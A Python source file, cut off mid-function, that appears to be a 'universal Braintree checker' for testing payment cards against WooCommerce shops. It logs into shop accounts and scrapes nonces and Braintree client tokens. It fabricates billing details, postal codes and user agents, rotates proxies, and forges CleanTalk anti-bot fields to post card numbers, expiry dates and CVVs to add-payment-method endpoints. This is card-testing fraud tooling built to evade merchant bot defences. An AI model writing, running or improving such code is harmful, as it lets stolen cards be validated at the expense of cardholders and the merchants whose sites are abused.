import requests
import re
import random
import string
from fake_useragent import UserAgent
import base64
import json
import uuid
import urllib3
from urllib.parse import urlparse
import os
import json
import requests

# New gateway for WooCommerce payment_method=braintree_credit_card
try:
    from b3_creditcard import process_braintree_credit_card, BraintreeCreditCardError
except Exception:
    process_braintree_credit_card = None
    BraintreeCreditCardError = Exception
import time
import config
from requests.exceptions import (
    ConnectionError, Timeout, ProxyError, 
    SSLError, RequestException, ConnectTimeout,
    ReadTimeout, TooManyRedirects
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def save_user_cookies(user_id, session):
    cookie_dir = f"cookies/{user_id}"
    os.makedirs(cookie_dir, exist_ok=True)
    cookie_path = os.path.join(cookie_dir, f"{user_id}.json")
    cookies_dict = requests.utils.dict_from_cookiejar(session.cookies)
    with open(cookie_path, "w") as f:
        json.dump(cookies_dict, f)

def load_user_cookies(user_id):
    cookie_path = f"cookies/{user_id}/{user_id}.json"
    if os.path.exists(cookie_path):
        with open(cookie_path, "r") as f:
            cookies_dict = json.load(f)
        return requests.utils.cookiejar_from_dict(cookies_dict)
    return None

def get_user_proxy(user_id):
    """Get user's proxy configuration for requests library."""
    proxy_path = f"proxies/{user_id}/proxy_{user_id}.json"
    if os.path.exists(proxy_path):
        try:
            with open(proxy_path, "r", encoding="utf-8") as f:
                proxy_data = json.load(f)
                if isinstance(proxy_data, dict) and proxy_data.get("ip") and proxy_data.get("port"):
                    ip = proxy_data["ip"]
                    port = proxy_data["port"]
                    username = proxy_data.get("username")
                    password = proxy_data.get("password")
                    
                    if username and password:
                        proxy_url = f"http://{username}:{password}@{ip}:{port}"
                    else:
                        proxy_url = f"http://{ip}:{port}"
                    
                    return {
                        "http": proxy_url,
                        "https": proxy_url
                    }
        except Exception:
            pass
    return None

def make_request_with_proxy_fallback(session, method, url, user_id=None, use_proxy=True, **kwargs):
    """Make HTTP request with proxy, fallback to direct if proxy fails."""
    # Remove use_proxy from kwargs if present (it's not a valid requests parameter)
    kwargs_clean = {k: v for k, v in kwargs.items() if k != 'use_proxy'}
    
    proxy = None
    if use_proxy and user_id:
        proxy = get_user_proxy(user_id)
    
    if proxy:
        try:
            kwargs_with_proxy = kwargs_clean.copy()
            kwargs_with_proxy['proxies'] = proxy
            if method.upper() == 'GET':
                return session.get(url, **kwargs_with_proxy)
            elif method.upper() == 'POST':
                return session.post(url, **kwargs_with_proxy)
        except Exception as e:
            # Proxy failed, fallback to direct connection
            print(f"Proxy failed, using direct connection: {e}")
            pass
    
    # Direct connection (no proxy or proxy failed)
    if method.upper() == 'GET':
        return session.get(url, **kwargs_clean)
    elif method.upper() == 'POST':
        return session.post(url, **kwargs_clean)

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

ua = UserAgent()

def generate_user_agent():
    return ua.random

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@yahoo.com"

def generate_username():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=20))
    return f"{name}{number}"

def generate_random_code(length=32):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

def random_string(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_postal_code_by_country(country_code):
    """Generate postal code based on country code."""
    country_code = country_code.upper() if country_code else 'US'
    
    # Countries that don't require postal codes
    no_postal_countries = ['AE', 'AG', 'AO', 'AW', 'BF', 'BI', 'BJ', 'BO', 'BS', 'BW', 'BZ', 
                          'CD', 'CF', 'CG', 'CI', 'CK', 'CM', 'CW', 'DJ', 'DM', 'ER', 'FJ', 
                          'GA', 'GD', 'GH', 'GM', 'GN', 'GQ', 'GW', 'GY', 'HK', 'IE', 'JM', 
                          'KE', 'KI', 'KM', 'KN', 'KP', 'LC', 'ML', 'MO', 'MR', 'MS', 'MU', 
                          'MW', 'NR', 'NU', 'QA', 'RW', 'SB', 'SC', 'SL', 'SR', 'ST', 'SY', 
                          'TD', 'TG', 'TL', 'TO', 'TT', 'TV', 'TZ', 'UG', 'VU', 'WS', 'YE', 'ZW']
    
    if country_code in no_postal_countries:
        return None  # No postal code needed
    
    # Country-specific postal code formats
    postal_formats = {
        'US': lambda: f"{random.randint(10000, 99999)}",  # 5-digit ZIP
        'CA': lambda: f"{random.choice(string.ascii_uppercase)}{random.randint(0, 9)}{random.choice(string.ascii_uppercase)} {random.randint(0, 9)}{random.choice(string.ascii_uppercase)}{random.randint(0, 9)}",  # Canadian format
        'GB': lambda: f"{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.randint(1, 9)}{random.randint(10, 99)} {random.randint(1, 9)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}",  # UK format
        'AU': lambda: f"{random.randint(1000, 9999)}",  # 4-digit
        'DE': lambda: f"{random.randint(10000, 99999)}",  # 5-digit
        'FR': lambda: f"{random.randint(10000, 99999)}",  # 5-digit
        'IT': lambda: f"{random.randint(10000, 99999)}",  # 5-digit
        'ES': lambda: f"{random.randint(10000, 99999)}",  # 5-digit
        'NL': lambda: f"{random.randint(1000, 9999)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}",  # 4 digits + 2 letters
        'BR': lambda: f"{random.randint(10000, 99999)}-{random.randint(100, 999)}",  # 5-3 format
        'MX': lambda: f"{random.randint(10000, 99999)}",  # 5-digit
        'IN': lambda: f"{random.randint(100000, 999999)}",  # 6-digit
        'JP': lambda: f"{random.randint(100, 999)}-{random.randint(1000, 9999)}",  # 3-4 format
        'CN': lambda: f"{random.randint(100000, 999999)}",  # 6-digit
        'KR': lambda: f"{random.randint(10000, 99999)}",  # 5-digit
    }
    
    # Return country-specific format or default 5-digit
    if country_code in postal_formats:
        return postal_formats[country_code]()
    else:
        # Default: 5-digit postal code
        return f"{random.randint(10000, 99999)}"

def generate_random_postal_code():
    """Generate a random postal code in common formats (default US)."""
    return get_postal_code_by_country('US')

def detect_postal_code_field(html_content):
    """Detect if postal code field exists in HTML and return field name."""
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Common postal code field names
    postal_code_patterns = [
        r'name=["\']([^"\']*postal[^"\']*code[^"\']*)["\']',
        r'name=["\']([^"\']*postcode[^"\']*)["\']',
        r'name=["\']([^"\']*zip[^"\']*)["\']',
        r'name=["\']([^"\']*billing[^"\']*postal[^"\']*)["\']',
        r'name=["\']([^"\']*billing[^"\']*postcode[^"\']*)["\']',
        r'id=["\']([^"\']*postal[^"\']*code[^"\']*)["\']',
        r'id=["\']([^"\']*postcode[^"\']*)["\']',
        r'id=["\']([^"\']*zip[^"\']*)["\']',
    ]
    
    # Check input fields
    inputs = soup.find_all(['input', 'select'], {'name': re.compile(r'postal|postcode|zip', re.I)})
    if inputs:
        for inp in inputs:
            if inp.get('name'):
                return inp.get('name')
    
    # Check by regex patterns
    for pattern in postal_code_patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        if matches:
            return matches[0]
    
    # Check for common WooCommerce field names
    common_fields = [
        'billing_postcode',
        'billing_postal_code',
        'postcode',
        'postal_code',
        'billing_zip',
        'zip',
    ]
    
    for field in common_fields:
        if field in html_content.lower():
            # Try to find the actual field name
            pattern = rf'name=["\']([^"\']*{field}[^"\']*)["\']'
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            if matches:
                return matches[0]
    
    return None

def get_country_from_dropdown(select_element):
    """Extract country code from select/dropdown element."""
    if not select_element or select_element.name != 'select':
        return None
    
    # Try to find selected option or first non-empty option
    selected_option = select_element.find('option', selected=True)
    if not selected_option:
        # Try to find option with value
        options = select_element.find_all('option', value=True)
        for opt in options:
            value = opt.get('value', '').strip()
            if value and value.upper() in ['US', 'GB', 'CA', 'AU', 'DE', 'FR', 'IT', 'ES', 'NL', 'BR', 'MX', 'IN', 'JP', 'CN', 'KR']:
                return value.upper()
            # Check if it's a country name, try to extract code
            text = opt.get_text().strip()
            if 'United States' in text or 'USA' in text:
                return 'US'
            elif 'United Kingdom' in text or 'UK' in text:
                return 'GB'
            elif 'Canada' in text:
                return 'CA'
    
    if selected_option:
        value = selected_option.get('value', '').strip()
        if value:
            # Check if it's a 2-letter country code
            if len(value) == 2 and value.isalpha():
                return value.upper()
            # Try to extract from text
            text = selected_option.get_text().strip()
            if 'United States' in text or 'USA' in text:
                return 'US'
            elif 'United Kingdom' in text or 'UK' in text:
                return 'GB'
            elif 'Canada' in text:
                return 'CA'
    
    # Default to US if nothing found
    return 'US'

def detect_required_billing_fields(html_content):
    """
    Enhanced billing field detection with multiple fallback checks.
    Handles various field name formats and structures.
    Now handles country dropdowns and matches postal codes to country.
    """
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html_content, 'html.parser')
    detected_fields = {}
    
    # Generate random values for common fields
    random_address = f"{random.randint(1, 999)} {random.choice(['Main', 'Oak', 'Park', 'Elm', 'Maple', 'Cedar', 'Pine'])} Street"
    random_city = random.choice(['London', 'New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia'])
    random_state = random.choice(['CA', 'NY', 'TX', 'FL', 'IL', 'PA', 'OH'])
    
    # First, detect country field (dropdown/select) to determine postal code format
    country_code = 'US'  # Default
    country_field_name = None
    
    # Field detection patterns: (field_type, patterns, default_value)
    field_patterns = [
        ('address', [
            r'name=["\']([^"\']*billing[^"\']*address[^"\']*1[^"\']*)["\']',
            r'name=["\']([^"\']*address[^"\']*1[^"\']*)["\']',
            r'name=["\']([^"\']*street[^"\']*address[^"\']*)["\']',
            r'name=["\']([^"\']*billing[^"\']*street[^"\']*)["\']',
            r'name=["\']([^"\']*address[^"\']*line[^"\']*1[^"\']*)["\']',
        ], random_address),
        ('city', [
            r'name=["\']([^"\']*billing[^"\']*city[^"\']*)["\']',
            r'name=["\']([^"\']*city[^"\']*)["\']',
            r'name=["\']([^"\']*billing[^"\']*town[^"\']*)["\']',
        ], random_city),
        ('state', [
            r'name=["\']([^"\']*billing[^"\']*state[^"\']*)["\']',
            r'name=["\']([^"\']*state[^"\']*)["\']',
            r'name=["\']([^"\']*billing[^"\']*province[^"\']*)["\']',
            r'name=["\']([^"\']*billing[^"\']*region[^"\']*)["\']',
        ], random_state),
        ('country', [
            r'name=["\']([^"\']*billing[^"\']*country[^"\']*)["\']',
            r'name=["\']([^"\']*country[^"\']*)["\']',
        ], 'US'),
    ]
    
    # STEP 1: Detect country field first (especially select/dropdown)
    country_selects = soup.find_all('select', {'name': re.compile(r'country', re.I)})
    if not country_selects:
        # Try common field names
        country_selects = soup.find_all('select', {'name': re.compile(r'billing.*country|country', re.I)})
    
    if country_selects:
        for country_select in country_selects:
            country_field_name = country_select.get('name')
            if country_field_name:
                country_code = get_country_from_dropdown(country_select)
                # Get the actual value from dropdown (prefer selected, or first valid option)
                selected_option = country_select.find('option', selected=True)
                if selected_option:
                    country_value = selected_option.get('value', country_code)
                else:
                    # Find first option with a valid country code
                    options = country_select.find_all('option', value=True)
                    for opt in options:
                        val = opt.get('value', '').strip()
                        if val and (len(val) == 2 and val.isalpha()):
                            country_value = val.upper()
                            country_code = val.upper()
                            break
                    else:
                        country_value = country_code
                
                detected_fields[country_field_name] = country_value
                print(f"Detected country dropdown: {country_field_name} = {country_value} (code: {country_code})")
                break
    
    # If country not found as select, try input fields
    if not country_field_name:
        country_inputs = soup.find_all(['input', 'select'], {'name': re.compile(r'country', re.I)})
        for inp in country_inputs:
            if inp.get('type') != 'hidden':
                country_field_name = inp.get('name')
                if country_field_name:
                    if inp.name == 'select':
                        country_code = get_country_from_dropdown(inp)
                        selected_option = inp.find('option', selected=True)
                        country_value = selected_option.get('value', country_code) if selected_option else country_code
                    else:
                        country_value = country_code
                    detected_fields[country_field_name] = country_value
                    print(f"Detected country field: {country_field_name} = {country_value} (code: {country_code})")
                    break
    
    # STEP 2: Generate postal code based on detected country (or skip if not needed)
    postal_code = get_postal_code_by_country(country_code)
    if postal_code is None:
        print(f"Country {country_code} does not require postal code - will skip postal code field")
    else:
        print(f"Generated postal code for {country_code}: {postal_code}")
    
    # STEP 3: Detect other fields (address, city, state)
    for field_type, patterns, default_value in field_patterns:
        if field_type == 'country':  # Already handled
            continue
            
        # Build search terms from patterns
        search_terms = []
        for pattern in patterns:
            if 'address' in pattern or 'street' in pattern:
                search_terms.extend(['address', 'street'])
            elif 'city' in pattern or 'town' in pattern:
                search_terms.extend(['city', 'town'])
            elif 'state' in pattern or 'province' in pattern or 'region' in pattern:
                search_terms.extend(['state', 'province', 'region'])
        
        # Search for fields by name containing these terms
        for term in search_terms:
            inputs = soup.find_all(['input', 'select'], {'name': re.compile(term, re.I)})
            if inputs:
                for inp in inputs:
                    field_name = inp.get('name')
                    if field_name and field_name not in detected_fields:
                        is_visible = inp.get('type') != 'hidden'
                        if is_visible:
                            detected_fields[field_name] = default_value
                            print(f"Detected {field_type} field: {field_name} = {default_value}")
                            break
                if any(term in str(k).lower() for k in detected_fields.keys()):
                    break
    
    # STEP 4: Detect postal code fields (only if country requires it)
    if postal_code is not None:
        postal_patterns = [
            r'name=["\']([^"\']*postal[^"\']*code[^"\']*)["\']',
            r'name=["\']([^"\']*postcode[^"\']*)["\']',
            r'name=["\']([^"\']*zip[^"\']*)["\']',
            r'name=["\']([^"\']*billing[^"\']*postal[^"\']*)["\']',
            r'name=["\']([^"\']*billing[^"\']*postcode[^"\']*)["\']',
            r'name=["\']([^"\']*billing[^"\']*zip[^"\']*)["\']',
        ]
        
        # Check input/select fields
        postal_inputs = soup.find_all(['input', 'select'], {'name': re.compile(r'postal|postcode|zip', re.I)})
        if postal_inputs:
            for inp in postal_inputs:
                field_name = inp.get('name')
                if field_name and field_name not in detected_fields:
                    is_visible = inp.get('type') != 'hidden'
                    if is_visible:
                        detected_fields[field_name] = postal_code
                        print(f"Detected postal code field: {field_name} = {postal_code}")
                        break
        
        # Try regex patterns if not found
        if not any('postal' in k.lower() or 'postcode' in k.lower() or 'zip' in k.lower() for k in detected_fields.keys()):
            for pattern in postal_patterns:
                matches = re.findall(pattern, html_content, re.IGNORECASE)
                if matches:
                    field_name = matches[0]
                    if field_name not in detected_fields:
                        field_elem = soup.find(attrs={'name': field_name})
                        if field_elem and field_elem.get('type') != 'hidden':
                            detected_fields[field_name] = postal_code
                            print(f"Detected postal code field via regex: {field_name} = {postal_code}")
                            break
        
        # Check common field names
        common_postal_fields = ['billing_postcode', 'billing_postal_code', 'postcode', 'postal_code', 'billing_zip', 'zip']
        for field_name in common_postal_fields:
            if field_name not in detected_fields:
                field_elem = soup.find(attrs={'name': field_name})
                if field_elem and field_elem.get('type') != 'hidden':
                    detected_fields[field_name] = postal_code
                    print(f"Detected common postal field: {field_name} = {postal_code}")
                    break
    
    # STEP 5: Check common WooCommerce field names for other fields
    common_fields = {
        'billing_address_1': random_address,
        'billing_address_2': '',
        'billing_city': random_city,
        'billing_state': random_state,
    }
    
    for field_name, default_value in common_fields.items():
        if field_name not in detected_fields:
            field_elem = soup.find(attrs={'name': field_name})
            if field_elem and field_elem.get('type') != 'hidden':
                detected_fields[field_name] = default_value
                print(f"Detected common field: {field_name} = {default_value}")
    
    return detected_fields

def detect_site_payment_format(html_content):
    """
    Enhanced format detection with multiple fallback checks.
    Handles various site formats for add payment method page.
    """
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html_content, 'html.parser')
    html_lower = html_content.lower()
    
    # Explicit quick check: if the page clearly has braintree_credit_card,
    # prefer format2 even if other markers (like ct_bot_detector) exist.
    if 'value="braintree_credit_card"' in html_lower or 'wc-braintree-credit-card' in html_lower:
        return 'format2'

    # Primary format detection patterns
    formats = {
        'braintree_cc': 'format1',
        'braintree_credit_card': 'format2',
        'wc-braintree-credit-card': 'format2',
        'braintree_cc_config_data': 'format3',
        'ct_bot_detector_event_token': 'format4',
        'apbct_visible_fields': 'format3',
        'ct_bot_detector': 'format3'
    }
    
    detected_formats = []
    for key, format_type in formats.items():
        if key in html_content or key in html_lower:
            detected_formats.append(format_type)
    
    # Check for format3 indicators (highest priority)
    if 'format3' in detected_formats or 'format4' in detected_formats:
        return 'format3'
    
    # Check for format2 indicators
    if 'format2' in detected_formats:
        return 'format2'
    
    # Additional checks for format2
    format2_patterns = [
        r'wc[_-]?braintree[_-]?credit[_-]?card',
        r'braintree[_-]?credit[_-]?card',
        r'payment[_-]?method[=:]\s*["\']?braintree[_-]?credit[_-]?card',
    ]
    for pattern in format2_patterns:
        if re.search(pattern, html_content, re.IGNORECASE):
            return 'format2'
    
    # Check for format3 additional patterns
    format3_patterns = [
        r'ct[_-]?bot[_-]?detector',
        r'apbct[_-]?visible[_-]?fields',
        r'braintree[_-]?cc[_-]?config[_-]?data',
    ]
    for pattern in format3_patterns:
        if re.search(pattern, html_content, re.IGNORECASE):
            return 'format3'
    
    # Check form structure - look for specific input names
    form_inputs = soup.find_all(['input', 'select'], {'name': re.compile(r'braintree|payment', re.I)})
    for inp in form_inputs:
        name = inp.get('name', '').lower()
        if 'wc-braintree-credit-card' in name or 'braintree_credit_card' in name:
            return 'format2'
        if 'braintree_cc_config' in name or 'ct_bot' in name:
            return 'format3'
    
    # Default to format1 (most common)
    return 'format1'

def build_device_data(sess=None, corr=None, merchant_id=None):
    if not sess:
        sess = generate_random_code()
    if not corr:
        corr = str(uuid.uuid4())
    
    simple_format = f'{{"correlation_id":"{corr}"}}'
    full_format = f'{{"device_session_id":"{sess}","fraud_merchant_id":{merchant_id or "null"},"correlation_id":"{corr}"}}'
    
    return simple_format, full_format

def build_payment_data_format1(tok, noncec, device_data_simple, billing_fields=None):
    data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': tok,
        'braintree_cc_device_data': device_data_simple,
        'woocommerce-add-payment-method-nonce': noncec,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1'
    }
    # Add detected billing fields if any
    if billing_fields:
        data.update(billing_fields)
    return data

def detect_payment_form_fields(html_content):
    """Detect all payment-related form fields that might be required."""
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html_content, 'html.parser')
    detected_fields = {}
    
    # Find all form inputs related to braintree/payment
    payment_inputs = soup.find_all(['input', 'select', 'textarea'], {
        'name': re.compile(r'braintree|payment|card|wc[_-]?braintree', re.I)
    })
    
    for inp in payment_inputs:
        field_name = inp.get('name')
        if field_name:
            field_type = inp.get('type', '').lower()
            # Skip if it's a submit button or file input
            if field_type in ['submit', 'button', 'file', 'image']:
                continue
            
            # Get default value
            default_value = inp.get('value', '')
            if not default_value and inp.name == 'select':
                # For select, get first option value
                first_option = inp.find('option', value=True)
                if first_option:
                    default_value = first_option.get('value', '')
            
            # For hidden fields or fields without value, use empty string
            if field_type == 'hidden' or not default_value:
                default_value = ''
            
            detected_fields[field_name] = default_value
    
    return detected_fields

def build_payment_data_format2(tok, noncec, device_data_simple, billing_fields=None, html_content=None):
    data = [
        ('payment_method', 'braintree_credit_card'),
        ('wc-braintree-credit-card-card-type', 'visa'),
        ('wc-braintree-credit-card-3d-secure-enabled', ''),
        ('wc-braintree-credit-card-3d-secure-verified', ''),
        ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
        ('wc_braintree_credit_card_payment_nonce', tok),  # Main token field
        ('wc_braintree_device_data', device_data_simple),
        ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
        # Alternative field names that some sites might require
        ('wc-braintree-credit-card-payment-nonce', tok),  # Alternative format
        ('braintree_credit_card_payment_nonce', tok),  # Another alternative
        ('wc_braintree_payment_nonce', tok),  # Yet another alternative
        ('wc_braintree_paypal_payment_nonce', ''),
        ('wc_braintree_device_data', device_data_simple),
        ('wc-braintree-paypal-context', 'shortcode'),
        ('wc_braintree_paypal_amount', '0.00'),
        ('wc_braintree_paypal_currency', 'GBP'),
        ('wc_braintree_paypal_locale', 'en_gb'),
        ('wc-braintree-paypal-tokenize-payment-method', 'true'),
        ('woocommerce-add-payment-method-nonce', noncec),
        ('_wp_http_referer', '/my-account/add-payment-method/'),
        ('woocommerce_add_payment_method', '1'),
    ]
    
    # Detect additional payment form fields from HTML if provided
    if html_content:
        form_fields = detect_payment_form_fields(html_content)
        for field_name, field_value in form_fields.items():
            # Only add if not already in data (avoid duplicates)
            if not any(field_name == item[0] for item in data):
                data.append((field_name, field_value))
                print(f"Added detected payment field: {field_name} = {field_value}")
    
    # Add detected billing fields if any
    if billing_fields:
        for field_name, field_value in billing_fields.items():
            # Only add if not already in data
            if not any(field_name == item[0] for item in data):
                data.append((field_name, field_value))
    
    return data

def build_payment_data_format3(tok, noncec, device_data_full, config_data=None, billing_fields=None):
    base_data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': tok,
        'braintree_cc_device_data': device_data_full,
        'braintree_cc_3ds_nonce_key': '',
        'billing_address_1': '123 Allen Street',  # Default fallback
        'woocommerce-add-payment-method-nonce': noncec,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }
    
    # Add detected billing fields if any (will override defaults)
    if billing_fields:
        base_data.update(billing_fields)
    
    if config_data:
        base_data['braintree_cc_config_data'] = config_data
    
    base_data.update({
        'ct_bot_detector_event_token': generate_random_code(64),
        'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiYmlsbGluZ19hZGRyZXNzXzEiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6ImJyYWludHJlZV9jY19ub25jZV9rZXkgYnJhaW50cmVlX2NjX2RldmljZV9kYXRhIGJyYWludHJlZV9jY18zZHNfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19jb25maWdfZGF0YSB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QgY3RfYm90X2RldGVjdG9yX3ZlcndyaXRlX2ZpZWxkIiwidGl0bGVfYnVpbGRfaWQiOiIxMjMhQWxsZW4gU3RyZWV0IiwidGl0bGVfYnVpbGRfc3RhdHVzIjoiMjAyMy0wMS0wMVQwMDowMDowMFoiLCJ0aXRsZV9idWlsZF9pZCI6IjEyMzBhbGxlbnN0cmVldCJ9fQ==',
        'ct_no_cookie_hidden_field': '',
    })
    
    return base_data

def extract_config_data(html_content):
    patterns = [
        r'braintree_cc_config_data[\'\"]\s*:\s*[\'\"](.*?)[\'\"]',
        r'"braintree_cc_config_data"\s*:\s*"(.*?)"',
        r'var wc_braintree_config\s*=\s*({.*?});',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content, re.DOTALL)
        if match:
            return match.group(1)
    
    return None

def get_client_token_multiple_methods(session, site, html_content, headers, user_id=None, use_proxy=True):
    token = parseX(html_content, 'var wc_braintree_client_token = ["', '"];')
    if token != "None":
        try:
            decoded_token = json.loads(base64.b64decode(token))['authorizationFingerprint']
            print(f"Got client token via direct extraction: {decoded_token}")
            return decoded_token
        except:
            pass
    
    patterns = [
        r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]',
        r'"client_token"\s*:\s*"([^"]+)"',
        r'clientToken\s*:\s*"([^"]+)"',
        r'client_token[\'\"]\s*:\s*[\'\"](.*?)[\'\"]'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            try:
                decoded_token = json.loads(base64.b64decode(match.group(1)))['authorizationFingerprint']
                print(f"Got client token via pattern matching: {decoded_token}")
                return decoded_token
            except:
                continue
    
    client_token_nonce = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', html_content)
    if client_token_nonce:
        client_token_nonce = client_token_nonce.group(1)
        print(f"Trying admin AJAX with nonce: {client_token_nonce}")
        
        ajax_headers = headers.copy()
        ajax_headers.update({
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
        })
        
        # Primary attempt: original credit-card action (backwards compatible)
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce,
        }
        
        try:
            response = make_request_with_proxy_fallback(
                session,
                'POST',
                f'{site}/wp-admin/admin-ajax.php',
                user_id=user_id,
                use_proxy=use_proxy,
                                  cookies=session.cookies, 
                                  headers=ajax_headers, 
                                  data=data, 
                verify=False,
            )
            response_data = response.json()
            # Some sites may return non-JSON or non-dict responses (e.g., integers or lists)
            # which would cause `'int' object has no attribute 'get'` errors.
            if isinstance(response_data, dict) and response_data.get('success'):
                decoded_token = json.loads(base64.b64decode(response_data['data']))['authorizationFingerprint']
                print(f"Got client token via AJAX (nonce action): {decoded_token}")
                return decoded_token
            else:
                # Extra debug so we can see what the site actually returns
                print(f"AJAX nonce call did not return success JSON. Raw response: {str(response_data)[:300]}")
        except Exception as e:
            print(f"AJAX request failed: {e}")
    
    # Fallback actions - try several common endpoints, including credit-card,
    # generic, PayPal-specific, and CC-style actions. For actions that expect a
    # nonce, we will send the same nonce we extracted earlier.
    ajax_actions = [
        'wc_braintree_paypal_get_client_token',
        'wc_braintree_credit_card_get_client_token',
        'wc_braintree_cc_get_client_token',
        'wc_braintree_get_client_token',
        'braintree_get_client_token',
        'get_braintree_token',
    ]
    
    for action in ajax_actions:
        try:
            data = {'action': action}
            if client_token_nonce and 'get_client_token' in action:
                # Many WooCommerce/Braintree actions require the nonce param
                data['nonce'] = client_token_nonce
            response = make_request_with_proxy_fallback(session, 'POST', f'{site}/wp-admin/admin-ajax.php', user_id=user_id, use_proxy=use_proxy,
                                  cookies=session.cookies, 
                                  headers=ajax_headers, 
                                  data=data, 
                                  verify=False)
            if response.status_code == 200:
                response_data = response.json()
                if isinstance(response_data, dict) and response_data.get('success') and 'data' in response_data:
                    decoded_token = json.loads(base64.b64decode(response_data['data']))['authorizationFingerprint']
                    print(f"Got client token via fallback action '{action}': {decoded_token}")
                    return decoded_token
                else:
                    print(f"AJAX fallback action '{action}' returned non-success JSON: {str(response_data)[:300]}")
        except:
            continue
    
    return None

def universal_braintree_checker_internal(site, username, password, card_number, exp_month, exp_year, cvv, postal_code='NP12 1AE', address='84 High St', user_id=None, use_proxy=True):
    user = generate_user_agent()
    r = requests.session()
    
    print(f"Starting universal check for: {site}")
    
    headers = {
        'authority': site.replace("https://", "").replace("http://", ""),
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'referer': f'{site}/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    print("Fetching login page...")
    # First try to get payment page - if redirected to login, use that
    r1 = make_request_with_proxy_fallback(r, 'GET', f'{site}/my-account/add-payment-method/', user_id=user_id, use_proxy=use_proxy, headers=headers, verify=False, allow_redirects=True)
    
    # If redirected to login, get the login page directly
    login_url = f'{site}/my-account/'
    if 'woocommerce-login-nonce' in r1.text or 'login' in r1.url.lower():
        print(f"Redirected to login page: {r1.url}")
        # Already have the login page content
    else:
        # Not redirected, try to get login page directly
        r1 = make_request_with_proxy_fallback(r, 'GET', login_url, user_id=user_id, use_proxy=use_proxy, headers=headers, verify=False, allow_redirects=True)
        login_url = r1.url
    
    nonce_patterns = [
        r'id="woocommerce-login-nonce".*?value="(.*?)"',
        r'name="woocommerce-login-nonce".*?value="(.*?)"',
        r'"woocommerce-login-nonce".*?value="(.*?)"'
    ]
    
    nonce = None
    for pattern in nonce_patterns:
        match = re.search(pattern, r1.text)
        if match:
            nonce = match.group(1)
            break
    
    if not nonce:
        print("Login nonce not found!")
        return False
    
    print(f"Got login nonce: {nonce}")
    
    headers.update({
        'content-type': 'application/x-www-form-urlencoded',
        'origin': site,
        'referer': login_url,
    })
    
    login_data = {
        'username': username,
        'password': password,
        'rememberme': 'forever',
        'woocommerce-login-nonce': nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'login': 'Log in',
    }
    
    # Try login with retry logic
    max_login_retries = 2
    login_success = False
    r2 = None
    
    for attempt in range(max_login_retries):
        print(f"Logging in... (attempt {attempt + 1}/{max_login_retries}, posting to {login_url})")
        r2 = make_request_with_proxy_fallback(r, 'POST', login_url, user_id=user_id, use_proxy=use_proxy,
                    cookies=r.cookies, headers=headers, data=login_data, verify=False, allow_redirects=False)
        
        # Check if login was successful - handle redirects
        if r2.status_code in (301, 302, 303, 307, 308):
            redirect_url = r2.headers.get('Location', '')
            if redirect_url:
                if not redirect_url.startswith('http'):
                    redirect_url = site + redirect_url if redirect_url.startswith('/') else f'{site}/{redirect_url}'
                print(f"Login redirected to: {redirect_url}")
                r2 = make_request_with_proxy_fallback(r, 'GET', redirect_url, user_id=user_id, use_proxy=use_proxy, cookies=r.cookies, headers=headers, verify=False)
        
        # Check if we're still on login page (login failed)
        if 'woocommerce-login-nonce' in r2.text or 'login' in r2.url.lower():
            print(f"Login attempt {attempt + 1} failed - still on login page")
            print(f"Response URL: {r2.url}")
            print(f"Response contains login nonce: {'woocommerce-login-nonce' in r2.text}")
            if attempt < max_login_retries - 1:
                # Retry - get fresh nonce
                print("Retrying login with fresh nonce...")
